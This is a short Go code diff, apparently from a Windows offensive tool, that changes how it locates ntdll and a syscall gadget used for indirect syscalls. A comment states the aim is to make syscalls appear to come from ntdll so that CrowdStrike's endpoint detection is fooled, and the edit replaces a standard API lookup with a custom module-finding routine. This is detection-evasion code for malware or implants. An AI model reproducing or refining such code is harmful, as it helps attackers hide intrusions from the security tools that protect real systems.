@@ -12,7 +12,6 @@ import (
 	"runtime"
 	"sort"
 	"strings"
-	"syscall"
 	"unsafe"
 )
 
@@ -182,8 +181,7 @@ func parseNtdllExports(pe []byte) []syscallEntry {
 // ntdll's .text section. Indirect syscalls execute from this address
 // so CrowdStrike sees the syscall originating from ntdll's address range.
 func findSyscallGadget() {
-	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	base, _, _ := pGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
+	base := findMod(mNtdll)
 	if base == 0 {
 		return
 	}
